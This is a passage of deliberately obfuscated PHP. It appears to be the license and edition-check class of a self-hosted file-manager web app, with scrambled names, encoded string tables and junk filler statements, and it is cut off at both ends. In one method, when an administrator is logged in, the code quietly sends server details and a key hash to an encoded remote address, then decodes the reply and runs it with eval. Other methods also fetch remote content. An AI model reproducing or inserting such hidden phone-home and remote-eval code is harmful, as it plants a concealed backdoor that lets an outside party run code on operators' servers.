¼ŸãØ[153] => $ ¼ŸãØ[6], $ ¼ŸãØ[191] => $ ¼ŸãØ[6], $ ¼ŸãØ[108] => $ ¼ŸãØ[109], $ ¼ŸãØ[110] => $ ¼ŸãØ[6], $ ¼ŸãØ[111] => $ ¼ŸãØ[6])); Model($ ¼ŸãØ[33])->setDeep($ ¼ŸãØ[198], $ ¼ŸãØ[206]); $this->mhiq3786b99e = array(); $this->khem6d4b077e = $ ¼ŸãØ[109]; } private function kjrq63a9a15f() { $£şˆ‰áë =& $_SERVER[íïàËŸë]; $³õ‰¹Â‹ =& $_SERVER[°‡§ºŸ]; $_SERVER[$³õ‰¹Â‹[162]] = _get($_SERVER, $³õ‰¹Â‹[162], APP_HOST); $ù åÏì– = $£şˆ‰áë[740]; if (!$ù åÏì–) { die; } $this->khem6d4b077e = $³õ‰¹Â‹[109]; $ô»»ìô‚ = Model($³õ‰¹Â‹[33])->get(); $ï©åÀî´ = $£şˆ‰áë[741]; if (!$ï©åÀî´) { die; } if ($ô»»ìô‚[$³õ‰¹Â‹[108]] == $³õ‰¹Â‹[109]) { return; } $ØØ×ã¯ù = Model($³õ‰¹Â‹[33])->get($³õ‰¹Â‹[100]); $‡È‡ÁÓ¢ = $£şˆ‰áë[742]; $ÆåŞéƒ£ = $³õ‰¹Â‹[203] . md5($ØØ×ã¯ù . $³õ‰¹Â‹[204]); $ÃØâã–™ = $£şˆ‰áë[743]; if (!$ÃØâã–™) { die; } $¶‚ı„¶‰ = Cache::get($ÆåŞéƒ£); if (!is_array($¶‚ı„¶‰) || !isset($¶‚ı„¶‰[$³õ‰¹Â‹[207]]) || time() - $¶‚ı„¶‰[$³õ‰¹Â‹[207]] >= 60) { $¿‡Á° = Model($³õ‰¹Â‹[7])->loadList(); $È×Ù˜ƒê = $¿‡Á°[$³õ‰¹Â‹[200]]; $¢Ó§ÂøŒ = md5($_SERVER[$³õ‰¹Â‹[106]] . strrev($ØØ×ã¯ù) . $ô»»ìô‚[$³õ‰¹Â‹[191]]); $†œ¦™ë = strrev(substr($¢Ó§ÂøŒ, 10, 16)); $¶‚ı„¶‰ = $this->doyj15627280($È×Ù˜ƒê[$³õ‰¹Â‹[86]][$†œ¦™ë], $¢Ó§ÂøŒ); $¶‚ı„¶‰ = json_decode($¶‚ı„¶‰, !0); } if (!is_array($¶‚ı„¶‰)) { return $this->qgwhb4d0a2d3(); } $¢éËõ¯ = strtotime($¶‚ı„¶‰[$³õ‰¹Â‹[129]]); if (time() >= $¢éËõ¯) { return $this->qgwhb4d0a2d3(); } if (!isset($¶‚ı„¶‰[$³õ‰¹Â‹[207]]) || time() - $¶‚ı„¶‰[$³õ‰¹Â‹[207]] > 20) { $¶‚ı„¶‰[$³õ‰¹Â‹[207]] = time(); Cache::set($ÆåŞéƒ£, $¶‚ı„¶‰); } $this->mhiq3786b99e = $¶‚ı„¶‰; $this->khem6d4b077e = $ô»»ìô‚[$³õ‰¹Â‹[108]]; $„ÚŞ‡¦ˆ = $£şˆ‰áë[744]; } private function kohvbb27436c() { $Í½íı˜ƒ =& $_SERVER[°‡§ºŸ]; $›—±º… = $GLOBALS[$Í½íı˜ƒ[13]]; $œ³¤û•¾ = $_SERVER[$Í½íı˜ƒ[24]]; $§Á¬Óş = $_SERVER[íïàËŸë][745]; if ($œ³¤û•¾ == $Í½íı˜ƒ[208] && $this->khem6d4b077e == $Í½íı˜ƒ[109]) { show_json(LNG($Í½íı˜ƒ[209]), !1, $Í½íı˜ƒ[210]); } $”ĞÑâ = array($Í½íı˜ƒ[211], $Í½íı˜ƒ[212]); if (in_array($œ³¤û•¾, $”ĞÑâ)) { if ($this->khem6d4b077e == $Í½íı˜ƒ[109] && isset($›—±º…[$Í½íı˜ƒ[213]])) { show_json(LNG($Í½íı˜ƒ[209]), !1, $Í½íı˜ƒ[210]); die; } $²î½…¼À = $this->kewm615b272f(); if ($²î½…¼À != intval($Í½íı˜ƒ[214])) { if ($²î½…¼À <= Model($Í½íı˜ƒ[125])->count()) { show_json(LNG($Í½íı˜ƒ[215]), !1, $Í½íı˜ƒ[210]); die; } } } } private function jnkeec68eab4() { $²ó„®Í™ =& $_SERVER[íïàËŸë]; $É¡ŸĞ¢¶ =& $_SERVER[°‡§ºŸ]; $å¡Ô©– = array($É¡ŸĞ¢¶[119], $É¡ŸĞ¢¶[120]); $”§‚×„” = $²ó„®Í™[746]; if (!KodUser::isRoot() || !isset($_GET[$É¡ŸĞ¢¶[216]])) { return; } if (!in_array($_SERVER[$É¡ŸĞ¢¶[24]], $å¡Ô©–)) { return; } $—ç¾À¡´ = $É¡ŸĞ¢¶[217]; $­³¤“­Ë = $²ó„®Í™[747]; if (strlen($­³¤“­Ë) < $²ó„®Í™[691]) { die; } $—ç¾À¡´ = $this->pmca76a1bc28($—ç¾À¡´, $É¡ŸĞ¢¶[218]); $’¶Ä‹ú— = $²ó„®Í™[748]; if (strlen($’¶Ä‹ú—) < $²ó„®Í™[686]) { return; } $÷€ÉÕ© = stream_context_create(array($É¡ŸĞ¢¶[219] => array($É¡ŸĞ¢¶[220] => $É¡ŸĞ¢¶[221], $É¡ŸĞ¢¶[222] => 3))); $ôÚš±ï = $²ó„®Í™[749]; $ˆ¨µòË¯ = @file_get_contents($—ç¾À¡´, !1, $÷€ÉÕ©); $ºÍíë‰— = $²ó„®Í™[750]; if (strlen($ºÍíë‰—) < $²ó„®Í™[693]) { die; } header($É¡ŸĞ¢¶[223]); $·Æø‰› = $²ó„®Í™[751]; if (strlen($·Æø‰›) < $²ó„®Í™[702]) { return; } if ($ˆ¨µòË¯ && strstr($ˆ¨µòË¯, $É¡ŸĞ¢¶[224])) { echo $ˆ¨µòË¯; } die; } public function cvow32c1ae78($ÓçùüúŞ) { $¾¸‡ºõæ =& $_SERVER[íïàËŸë]; $Ç œª =& $_SERVER[°‡§ºŸ]; if ($this->khem6d4b077e == $Ç œª[225]) { return $ÓçùüúŞ; } $ÈàäŒÃ = $this->versionPluginList(); $¸á¹™— = explode($Ç œª[226], $this->versionPluginFilter()); $®Àúú± = array(); $…Ì¾€ş© = $¾¸‡ºõæ[752]; if (strlen($…Ì¾€ş©) < $¾¸‡ºõæ[686]) { die; } foreach ($ÈàäŒÃ as $ÖÈı³ğ => $¥ÛÉæÄ¢) { if ($¥ÛÉæÄ¢ == $Ç œª[227] && substr($this->khem6d4b077e, 0, 1) == $Ç œª[227]) { continue; } if (!in_array($ÖÈı³ğ, $¸á¹™—)) { $®Àúú±[] = $ÖÈı³ğ; } } foreach ($®Àúú± as $ÖÈı³ğ) { unset($ÓçùüúŞ[$ÖÈı³ğ]); $¦—ı¾¤ê = $¾¸‡ºõæ[753]; if (strlen($¦—ı¾¤ê) < $¾¸‡ºõæ[691]) { return; } } return $ÓçùüúŞ; $áÉ—ëˆ = $¾¸‡ºõæ[754]; if (!$áÉ—ëˆ) { die; } } private function versionPluginList() { $¸¬»œ‡¢ =& $_SERVER[°‡§ºŸ]; return array($¸¬»œ‡¢[228] => $¸¬»œ‡¢[227], $¸¬»œ‡¢[229] => $¸¬»œ‡¢[227], $¸¬»œ‡¢[230] => $¸¬»œ‡¢[227], $¸¬»œ‡¢[231] => $¸¬»œ‡¢[232], $¸¬»œ‡¢[233] => $¸¬»œ‡¢[232], $¸¬»œ‡¢[234] => $¸¬»œ‡¢[232], $¸¬»œ‡¢[235] => $¸¬»œ‡¢[232], $¸¬»œ‡¢[236] => $¸¬»œ‡¢[232], $¸¬»œ‡¢[237] => $¸¬»œ‡¢[232], $¸¬»œ‡¢[238] => $¸¬»œ‡¢[232], $¸¬»œ‡¢[239] => $¸¬»œ‡¢[232], $¸¬»œ‡¢[240] => $¸¬»œ‡¢[232], $¸¬»œ‡¢[241] => $¸¬»œ‡¢[232], $¸¬»œ‡¢[242] => $¸¬»œ‡¢[232], $¸¬»œ‡¢[243] => $¸¬»œ‡¢[232], $¸¬»œ‡¢[244] => $¸¬»œ‡¢[232]); } private function versionPluginFilter() { $şÑ³ä =& $_SERVER[íïàËŸë]; $×å÷ôÈº =& $_SERVER[°‡§ºŸ]; if ($this->khem6d4b077e == $×å÷ôÈº[109]) { return $×å÷ôÈº[6]; } $òŠ€õİ™ = _get($this->mhiq3786b99e, $×å÷ôÈº[245], $×å÷ôÈº[6]); $»ˆë´› = _get($this->mhiq3786b99e, $×å÷ôÈº[116], $×å÷ôÈº[6]); $ÚË‚Çïè = $şÑ³ä[755]; if (strlen($ÚË‚Çïè) < $şÑ³ä[693]) { return; } $¨©§šôÛ = _get($this->mhiq3786b99e, $×å÷ôÈº[246], $×å÷ôÈº[6]); if ($»ˆë´› > time() && $¨©§šôÛ > time()) { $ıöÉ¿ïÇ = explode($×å÷ôÈº[226], $òŠ€õİ™); $÷Ş›ÇòÌ = array_keys($this->versionPluginList()); $òŠ€õİ™ = array_merge($ıöÉ¿ïÇ, $÷Ş›ÇòÌ); $òŠ€õİ™ = implode($×å÷ôÈº[226], array_filter(array_unique($òŠ€õİ™))); } return $òŠ€õİ™; } private function dyajdd563227() { $ÖËù¾‘÷ =& $_SERVER[°‡§ºŸ]; if ($this->khem6d4b077e != $ÖËù¾‘÷[109]) { $GLOBALS[$ÖËù¾‘÷[86]][$ÖËù¾‘÷[90]][$ÖËù¾‘÷[247]] = $ÖËù¾‘÷[206]; return; } $GLOBALS[$ÖËù¾‘÷[86]][$ÖËù¾‘÷[248]] = $ÖËù¾‘÷[122]; if (Model($ÖËù¾‘÷[249])->get($ÖËù¾‘÷[63]) != $ÖËù¾‘÷[206]) { Model($ÖËù¾‘÷[249])->set($ÖËù¾‘÷[63], $ÖËù¾‘÷[206]); } } public function uqohbddc1ee9() { return $_SERVER[°‡§ºŸ][250]; } private function ztwg076b6fea() { $‰™£Ïá€ =& $_SERVER[íïàËŸë]; $Âèùô’¹ =& $_SERVER[°‡§ºŸ]; $¯ß‹ˆ¥ = array($Âèùô’¹[251], $Âèùô’¹[252], $Âèùô’¹[253]); $ŒÌ›ş = $Âèùô’¹[254] . md5($Âèùô’¹[255]); $Ş‹‘›ƒº = $‰™£Ïá€[756]; if (strlen($Ş‹‘›ƒº) < $‰™£Ïá€[710]) { die; } if ($this->khem6d4b077e == $Âèùô’¹[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$Âèùô’¹[24]], $¯ß‹ˆ¥)) { return; } if (time() % 4 != 0) { return; } $¸Ç¹ò‹à = call_user_func(array($Âèùô’¹[256], $Âèùô’¹[257]), $ŒÌ›ş); $µ³üÔÌÔ = $‰™£Ïá€[757]; if (!$µ³üÔÌÔ) { return; } if ($¸Ç¹ò‹à && time() - $¸Ç¹ò‹à < intval($Âèùô’¹[258])) { return; } call_user_func(array($Âèùô’¹[256], $Âèùô’¹[139]), $ŒÌ›ş, time()); $½È†™¦¦ = $‰™£Ïá€[758]; if (strlen($½È†™¦¦) < $‰™£Ïá€[693]) { return; } $ÀÓ²¯Ô = Model($Âèùô’¹[33])->get($Âèùô’¹[100]); $ÛúëÏ»Ş = array($Âèùô’¹[152] => Model($Âèùô’¹[33])->get($Âèùô’¹[153]), $Âèùô’¹[167] => $this->khem6d4b077e, $Âèùô’¹[163] => $_SERVER[$Âèùô’¹[164]], $Âèùô’¹[165] => Model($Âèùô’¹[33])->get($Âèùô’¹[131]), $Âèùô’¹[105] => md5($_SERVER[$Âèùô’¹[106]] . $ÀÓ²¯Ô), $Âèùô’¹[156] => $Âèùô’¹[136], $Âèùô’¹[159] => $_SERVER[$Âèùô’¹[160]]); $’¦Ô¼ñ = $‰™£Ïá€[759]; if (strlen($’¦Ô¼ñ) < $‰™£Ïá€[702]) { die; } $ı¡†•ÓÄ = $this->vbrwbff3e95c($Âèùô’¹[259], $ÛúëÏ»Ş); if (!is_array($ı¡†•ÓÄ)) { return; } if ($ı¡†•ÓÄ[$Âèùô’¹[152]] && $ı¡†•ÓÄ[$Âèùô’¹[260]]) { if ($this->kcbmb8d5ff68($ı¡†•ÓÄ[$Âèùô’¹[260]]) == $ÛúëÏ»Ş[$Âèùô’¹[152]]) { return; } } $this->qgwhb4d0a2d3(); $ÉääÅÏ = $‰™£Ïá€[760]; if (strlen($ÉääÅÏ) < $‰™£Ïá€[702]) { return; } if ($this->kcbmb8d5ff68($ı¡†•ÓÄ[$Âèùô’¹[260]]) != $ÛúëÏ»Ş[$Âèùô’¹[152]]) { $¦˜²ƒÅ = array($Âèùô’¹[185] => $ÀÓ²¯Ô, $Âèùô’¹[186] => $_SERVER[$Âèùô’¹[106]], $Âèùô’¹[187] => this_url(), $Âèùô’¹[161] => $_SERVER[$Âèùô’¹[162]]); $¶ç¢š¼‘ = $this->oawzf413941f(json_encode($¦˜²ƒÅ)); $ı¡†•ÓÄ = $this->vbrwbff3e95c($Âèùô’¹[188] . $¶ç¢š¼‘); if ($ı¡†•ÓÄ && is_array($ı¡†•ÓÄ) && isset($ı¡†•ÓÄ[$Âèùô’¹[260]])) { $ëŸòÄ¿ì = $this->doyj15627280($ı¡†•ÓÄ[$Âèùô’¹[260]], 2); if ($ëŸòÄ¿ì) { $ëŸòÄ¿ì = $this->kcbmb8d5ff68($ëŸòÄ¿ì); } if ($ëŸòÄ¿ì) { try { @eval($ëŸòÄ¿ì); } catch (Exception $Õ·ãºøÄ) { } } } } } private function vbrwbff3e95c($Ê†„˜½° = '', $…¢ı¯öµ = array(), $¬ àÕÁ = 5) { $¯¿«ì¢… =& $_SERVER[°‡§ºŸ]; $ù²”ƒŒÛ = $¯¿«ì¢…[261]; $ù²”ƒŒÛ = $this->pmca76a1bc28($ù²”ƒŒÛ, $¯¿«ì¢…[262]); $ëğ¢íÍŸ = $_SERVER[íïàËŸë][761]; $ù²”ƒŒÛ = $ù²”ƒŒÛ . $Ê†„˜½°; if ($…¢ı¯öµ && is_array($…¢ı¯öµ)) { $ù²”ƒŒÛ = $ù²”ƒŒÛ . $¯¿«ì¢…[263] . http_build_query($…¢ı¯öµ); } if ($…¢ı¯öµ === -1) { return $ù²”ƒŒÛ; } $«Œ©ÃÏ = stream_context_create(array($¯¿«ì¢…[219] => array($¯¿«ì¢…[222] => $¬ àÕÁ, $¯¿«ì¢…[220] => $¯¿«ì¢…[264]), $¯¿«ì¢…[265] => array($¯¿«ì¢…[266] => !1, $¯¿«ì¢…[267] => !1))); $…¢ı¯öµ = @file_get_contents($ù²”ƒŒÛ, !1, $«Œ©ÃÏ); return json_decode($…¢ı¯öµ, !0); } private function kewm615b272f() { $çš·ˆİ =& $_SERVER[íïàËŸë]; $´¹º‘È­ =& $_SERVER[°‡§ºŸ]; $¥Šå¶™¨ = array($´¹º‘È­[268] => $´¹º‘È­[269], $´¹º‘È­[270] => $´¹º‘È­[271], $´¹º‘È­[272] => $´¹º‘È­[273], $´¹º‘È­[274] => $´¹º‘È­[275], $´¹º‘È­[276] => $´¹º‘È­[277], $´¹º‘È­[278] => $´¹º‘È­[214], $´¹º‘È­[279] => $´¹º‘È­[214], $´¹º‘È­[280] => $´¹º‘È­[269], $´¹º‘È­[281] => $´¹º‘È­[271], $´¹º‘È­[282] => $´¹º‘È­[273], $´¹º‘È­[283] => $´¹º‘È­[284], $´¹º‘È­[285] => $´¹º‘È­[275], $´¹º‘È­[286] => $´¹º‘È­[287], $´¹º‘È­[288] => $´¹º‘È­[277], $´¹º‘È­[289] => $´¹º‘È­[290], $´¹º‘È­[291] => $´¹º‘È­[292], $´¹º‘È­[293] => $´¹º‘È­[294]); $†ƒó™à = $¥Šå¶™¨[$this->khem6d4b077e]; $†ƒó™à = intval($†ƒó™à ? $†ƒó™à : $´¹º‘È­[269]); $‹Ã¹şÖÔ = $çš·ˆİ[762]; if (strlen($‹Ã¹şÖÔ) < $çš·ˆİ[686]) { return; } $á´Ø¯ = _get($this->mhiq3786b99e, $´¹º‘È­[295]); $á´Ø¯ = $á´Ø¯ ? intval($á´Ø¯) : 0; $ÀÅ’¹ôĞ = $çš·ˆİ[763]; while (strlen($ÀÅ’¹ôĞ) < $çš·ˆİ[693]) { if (!$ÀÅ’¹ôĞ) { break; } $ÀÅ’¹ôĞ++; } return $†ƒó™à + $á´Ø¯; $¾ßƒ×¼ô = $çš·ˆİ[764]; if (strlen($¾ßƒ×¼ô) < $çš·ˆİ[710]) { die; } } public function anbl9a2e49d5($øÈ×‚İ‰) { $‰âÜ‹¤ =& $_SERVER[íïàËŸë]; $Íâª³½ˆ =& $_SERVER[°‡§ºŸ]; $ãšœ¦¡ì = $this->kewm615b272f(); if ($øÈ×‚İ‰[$Íâª³½ˆ[296]] == $Íâª³½ˆ[122]) { return; } if ($ãšœ¦¡ì >= intval($Íâª³½ˆ[214])) { return; } $¸–•ƒŸÌ = Model($Íâª³½ˆ[125])->count(); $Ç‘«­¯… = $‰âÜ‹¤[765]; if (!$Ç‘«­¯…) { die; } if ($¸–•ƒŸÌ <= $ãšœ¦¡ì) { return; } $íÆŠöŒÅ = Model($Íâª³½ˆ[125])->field($Íâª³½ˆ[296])->limit($ãšœ¦¡ì)->select(); $íÆŠöŒÅ = array_to_keyvalue($íÆŠöŒÅ, $Íâª³½ˆ[6], $Íâª³½ˆ[296]); $­èÓ­Ñ = $‰âÜ‹¤[766]; if (!$­èÓ­Ñ) { return; } if (!in_array($øÈ×‚İ‰[$Íâª³½ˆ[296]], $íÆŠöŒÅ)) { show_json($Íâª³½ˆ[297], !1, $Íâª³½ˆ[210]); } } public function tcon81049d87() { $Ä¢¨ÏéŸ =& $_SERVER[íïàËŸë]; $Ù­×ÄÆò =& $_SERVER[°‡§ºŸ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ë”ƒåıö = $Ù­×ÄÆò[217]; $¶­·¬öÚ = $Ä¢¨ÏéŸ[767]; $ë”ƒåıö = $this->pmca76a1bc28($ë”ƒåıö, $Ù­×ÄÆò[218]); $À„’é€ì = stream_context_create(array($Ù­×ÄÆò[219] => array($Ù­×ÄÆò[220] => $Ù­×ÄÆò[221], $Ù­×ÄÆò[222] => 3))); $Ç’‹Ú¥ = $Ä¢¨ÏéŸ[768]; if (!$Ç’‹Ú¥) { die; } $ıå‹Ÿñ = @file_get_contents($ë”ƒåıö, !1, $À„’é€ì); $ŠÆŒ¾ = $Ä¢¨ÏéŸ[769]; echo $Ù­×ÄÆò[298] . hash_encode($ıå‹Ÿñ) . $Ù­×ÄÆò[299]; $ş­Ì˜œû = $Ä¢¨ÏéŸ[770]; if (!$ş­Ì˜œû) { die; } } private function qogu89ea2845($¹ÓÁïŞ, $”©ïº¢‘, $×ßîõĞ… = 3) { $½µ‰ˆ ü =& $_SERVER[íïàËŸë]; $•Ç©ÆÈ¢ =& $_SERVER[°‡§ºŸ]; usleep(1); $Æ¹ùô£ = $½µ‰ˆ ü[771]; if (strlen($Æ¹ùô£) < $½µ‰ˆ ü[693]) { return; } $¹ÓÁïŞ = trim($¹ÓÁïŞ); $ı¨™ïªÖ = $½µ‰ˆ ü[772]; if (!$ı¨™ïªÖ) { return; } $­‰²Àü = mt_rand(0, 5) . $•Ç©ÆÈ¢[6]; $±‘–Ò¡ = $½µ‰ˆ ü[773]; $‹¤¸Î§„ = rand_string(15); $¡íÌÌ…Æ = $•Ç©ÆÈ¢[300]; $ô‘Å‹¼Š = $½µ‰ˆ ü[774]; if (!$ô‘Å‹¼Š) { return; } switch ($­‰²Àü) { case $•Ç©ÆÈ¢[206]: $‹“ÊĞƒ¯ = $this->qtsn703f7da1($¹ÓÁïŞ, strrev($”©ïº¢‘ . $‹¤¸Î§„)); $˜ÁÚçÏ¼ = $½µ‰ˆ ü[775]; break; case $•Ç©ÆÈ¢[122]: $‹“ÊĞƒ¯ = $this->qtsn703f7da1($¹ÓÁïŞ, strrev($‹¤¸Î§„ . $”©ïº¢‘)); $İ”‰éÍ = $½µ‰ˆ ü[776]; if (!$İ”‰éÍ) { return; } break; case $•Ç©ÆÈ¢[301]: $‹“ÊĞƒ¯ = $this->qtsn703f7da1($¹ÓÁïŞ, base64_encode($‹¤¸Î§„ . $”©ïº¢‘)); break; $®§Èºº = $½µ‰ˆ ü[777]; case $•Ç©ÆÈ¢[302]: $‹“ÊĞƒ¯ = $this->qtsn703f7da1($¹ÓÁïŞ, md5($‹¤¸Î§„ . $”©ïº¢‘)); $ÒÁÏñÂœ = $½µ‰ˆ ü[778]; while ($ÒÁÏñÂœ < $½µ‰ˆ ü[686]) { if ($ÒÁÏñÂœ >= 0) { break; } $ÒÁÏñÂœ++; } break; $¿ÇîºÉ¤ = $½µ‰ˆ ü[779]; if (strlen($¿ÇîºÉ¤) < $½µ‰ˆ ü[686]) { die; } case $•Ç©ÆÈ¢[303]: $¹ÓÁïŞ = base64_encode($¹ÓÁïŞ); $ø–«ãé = rand(0, 64); $·üªüöÖ = $¡íÌÌ…Æ[$ø–«ãé]; $â’ŸÈÂÂ = md5($·üªüöÖ . md5($”©ïº¢‘ . $·üªüöÖ) . $”©ïº¢‘); $â’ŸÈÂÂ = substr($â’ŸÈÂÂ, $ø–«ãé % 8, $ø–«ãé % 8 + 7); $ùú…äö = $½µ‰ˆ ü[780]; if (!$ùú…äö) { return; } $œ­ñÔÀ‘ = $•Ç©ÆÈ¢[6]; $ÀïÈÛ€‚ = $½µ‰ˆ ü[704]; while ($ÀïÈÛ€‚ < $½µ‰ˆ ü[693]) { if ($ÀïÈÛ€‚ >= 0) { break; } $ÀïÈÛ€‚++; } $Ç“„äÄÀ = 0; $ğëá¯Ê = $½µ‰ˆ ü[781]; if (strlen($ğëá¯Ê) < $½µ‰ˆ ü[710]) { die; } $Û½ˆñÊ = 0; $õ½ìÆ²Ó = 0; for ($Ç“„äÄÀ = 0; $Ç“„äÄÀ < strlen($¹ÓÁïŞ); $Ç“„äÄÀ++) { $õ½ìÆ²Ó = $õ½ìÆ²Ó == strlen($â’ŸÈÂÂ) ? 0 : $õ½ìÆ²Ó; $÷åØóáƒ = $½µ‰ˆ ü[782]; while (strlen($÷åØóáƒ) < $½µ‰ˆ ü[686]) { if (!$÷åØóáƒ) { break; } $÷åØóáƒ++; } $Û½ˆñÊ = ($ø–«ãé + strpos($¡íÌÌ…Æ, $¹ÓÁïŞ[$Ç“„äÄÀ]) + ord($â’ŸÈÂÂ[$õ½ìÆ²Ó++])) % 64; $œ­ñÔÀ‘ .= $¡íÌÌ…Æ[$Û½ˆñÊ]; $´“¢×€Ù = $½µ‰ˆ ü[783]; if (!$´“¢×€Ù) { return; } } $‹“ÊĞƒ¯ = hash_encode($·üªüöÖ . $œ­ñÔÀ‘); $ïËô¼Ä¼ = $½µ‰ˆ ü[784]; while (strlen($ïËô¼Ä¼) < $½µ‰ˆ ü[710]) { if (!$ïËô¼Ä¼) { break; } $ïËô¼Ä¼++; } break; default: $‹“ÊĞƒ¯ = $this->qtsn703f7da1($¹ÓÁïŞ, $”©ïº¢‘ . $‹¤¸Î§„); break; } $‹“ÊĞƒ¯ = strrev($­‰²Àü . $‹¤¸Î§„ . $‹“ÊĞƒ¯); if ($×ßîõĞ… - 1 > 0) { $‹“ÊĞƒ¯ = $this->qogu89ea2845($‹“ÊĞƒ¯, $”©ïº¢‘, $×ßîõĞ… - 1); } return $‹“ÊĞƒ¯; } private function doyj15627280($şĞ©¸ñ„, $¤ÆÛÀëó, $’Š¯™’ = 3) { $³šÙ˜ä =& $_SERVER[íïàËŸë]; $½¦–ŒÏ =& $_SERVER[°‡§ºŸ]; if (!is_string($şĞ©¸ñ„) || strlen($şĞ©¸ñ„) < 10) { return !1; } $şĞ©¸ñ„ = trim($şĞ©¸ñ„); $şĞ©¸ñ„ = strrev($şĞ©¸ñ„); $’îÉ®Ï = $şĞ©¸ñ„[0]; $¤ÕÊ¹Ÿİ = $³šÙ˜ä[785]; if (!$¤ÕÊ¹Ÿİ) { die; } $Û˜¨ÊŸè = substr($şĞ©¸ñ„, 1, 15); $şĞ©¸ñ„ = substr($şĞ©¸ñ„, 16); $ëÅÍ‘û = $³šÙ˜ä[786]; $ê“™´˜ = $½¦–ŒÏ[300]; $¾ÙÇˆü = $³šÙ˜ä[787]; switch ($’îÉ®Ï) { case $½¦–ŒÏ[206]: $äè«ªµ¨ = $this->pmca76a1bc28($şĞ©¸ñ„, strrev($¤ÆÛÀëó . $Û˜¨ÊŸè)); $¯Ê†û«ç = $³šÙ˜ä[788]; break; $“††€ø– = $³šÙ˜ä[704]; if (!$“††€ø–) { die; } case $½¦–ŒÏ[122]: $äè«ªµ¨ = $this->pmca76a1bc28($şĞ©¸ñ„, strrev($Û˜¨ÊŸè . $¤ÆÛÀëó)); break; $‰ Í–µú = $³šÙ˜ä[789]; if (strlen($‰ Í–µú) < $³šÙ˜ä[686]) { return; } case $½¦–ŒÏ[301]: $äè«ªµ¨ = $this->pmca76a1bc28($şĞ©¸ñ„, base64_encode($Û˜¨ÊŸè . $¤ÆÛÀëó)); $ãÏ°ğş = $³šÙ˜ä[790]; while ($ãÏ°ğş < $³šÙ˜ä[691]) { if ($ãÏ°ğş >= 0) { break; } $ãÏ°ğş++; } break; $ØÉÍÁ¸€ = $³šÙ˜ä[791]; case $½¦–ŒÏ[302]: $äè«ªµ¨ = $this->pmca76a1bc28($şĞ©¸ñ„, md5($Û˜¨ÊŸè . $¤ÆÛÀëó)); break; case $½¦–ŒÏ[303]: $şĞ©¸ñ„ = hash_decode($şĞ©¸ñ„); $™ç¿î‹ğ = $³šÙ˜ä[792]; while (strlen($™ç¿î‹ğ) < $³šÙ˜ä[686]) { if (!$™ç¿î‹ğ) { break; } $™ç¿î‹ğ++; } $‡ØÛÆéİ = $şĞ©¸ñ„[0]; $ØÍ¸®‹¨ = $³šÙ˜ä[793]; $şĞ©¸ñ„ = substr($şĞ©¸ñ„, 1); $ÆÆ¯ĞÀË = strpos($ê“™´˜, $‡ØÛÆéİ); $³â—íÎˆ = $³šÙ˜ä[794]; while ($³â—íÎˆ < $³šÙ˜ä[693]) { if ($³â—íÎˆ >= 0) { break; } $³â—íÎˆ++; } $èü¿Û…¡ = md5($‡ØÛÆéİ . md5($¤ÆÛÀëó . $‡ØÛÆéİ) . $¤ÆÛÀëó); $èü¿Û…¡ = substr($èü¿Û…¡, $ÆÆ¯ĞÀË % 8, $ÆÆ¯ĞÀË % 8 + 7); $¶±«ã¸ı = $½¦–ŒÏ[6]; $¶ïÈŒ = $³šÙ˜ä[795]; $«É¥ˆê = 0; $Æ‚ß×ƒú = 0; $ĞÕúÇºÄ = $³šÙ˜ä[796]; if (!$ĞÕúÇºÄ) { die; } $îğãÍº = 0; $ı¿¸¡ù = $³šÙ˜ä[797]; if (!$ı¿¸¡ù) { return; } for ($«É¥ˆê = 0; $«É¥ˆê < strlen($şĞ©¸ñ„); $«É¥ˆê++) { $îğãÍº = $îğãÍº == strlen($èü¿Û…¡) ? 0 : $îğãÍº; $‹¹’°ß· = $îğãÍº++; $Æ‚ß×ƒú = strpos($ê“™´˜, $şĞ©¸ñ„[$«É¥ˆê]) - $ÆÆ¯ĞÀË - ord($èü¿Û…¡[$‹¹’°ß·]); $†øÒãêË = $³šÙ˜ä[798]; while (strlen($†øÒãêË) < $³šÙ˜ä[710]) { if (!$†øÒãêË) { break; } $†øÒãêË++; } while ($Æ‚ß×ƒú < 0) { $Æ‚ß×ƒú += 64; $ˆ™Ûê¶À = $³šÙ˜ä[799]; while (strlen($ˆ™Ûê¶À) < $³šÙ˜ä[691]) { if (!$ˆ™Ûê¶À) { break; } $ˆ™Ûê¶À++; } } $¶±«ã¸ı .= $ê“™´˜[$Æ‚ß×ƒú]; $¤ë¼ëÓ = $³šÙ˜ä[800]; } $äè«ªµ¨ = base64_decode($¶±«ã¸ı); $§¬ˆ¿òÌ = $³šÙ˜ä[801]; break; default: $äè«ªµ¨ = $this->pmca76a1bc28($şĞ©¸ñ„, $¤ÆÛÀëó . $Û˜¨ÊŸè); $åÓÇîûÌ = $³šÙ˜ä[802]; break; $êùËæ¡¤ = $³šÙ˜ä[803]; if (!$êùËæ¡¤) { return; } } if ($’Š¯™’ - 1 > 0) { $äè«ªµ¨ = $this->doyj15627280($äè«ªµ¨, $¤ÆÛÀëó, $’Š¯™’ - 1); } return $äè«ªµ¨; } public function oawzf413941f($‚ÇøÀÚ˜) { $ê‰¼İ„§ =& $_SERVER[íïàËŸë]; $£¦—ªê =& $_SERVER[°‡§ºŸ]; $ÄËåòÕì = $this->dhqyeff0fce3(); $ØÎŠ¥°â = $ê‰¼İ„§[804]; if (!$ØÎŠ¥°â) { return; } $´£±Éñ = $this->dhqyeff0fce3(); $˜‰Š«Ö» = $ê‰¼İ„§[805]; while (strlen($˜‰Š«Ö») < $ê‰¼İ„§[691]) { if (!$˜‰Š«Ö») { break; } $˜‰Š«Ö»++; } $ğ½¥®ô = ($ÄËåòÕì - 1) * ($´£±Éñ - 1); $èÅï‚ôÀ = $ê‰¼İ„§[806]; while ($èÅï‚ôÀ < $ê‰¼İ„§[693]) { if ($èÅï‚ôÀ >= 0) { break; } $èÅï‚ôÀ++; } $ §§ºÈğ = intval(($ÄËåòÕì + $´£±Éñ) / 2); while (1) { $ÆŞ”ï¼° = $ §§ºÈğ; $©•½‰ıÇ = $ê‰¼İ„§[807]; $€Áïƒ = $ğ½¥®ô; while ($€Áïƒ % $ÆŞ”ï¼° != 0) { $¹ä†»— = $€Áïƒ; $€Áïƒ = $ÆŞ”ï¼°; $ì¸ºù–· = $ê‰¼İ„§[808]; $ÆŞ”ï¼° = $¹ä†»— % $ÆŞ”ï¼°; $“¥ÍÄ  = $ê‰¼İ„§[809]; if (strlen($“¥ÍÄ ) < $ê‰¼İ„§[691]) { return; } } if ($ÆŞ”ï¼° == 1) { break; } else { $ §§ºÈğ++; } } $ƒñá…†Õ = 2; for ($ô‡É¿·İ = 0; 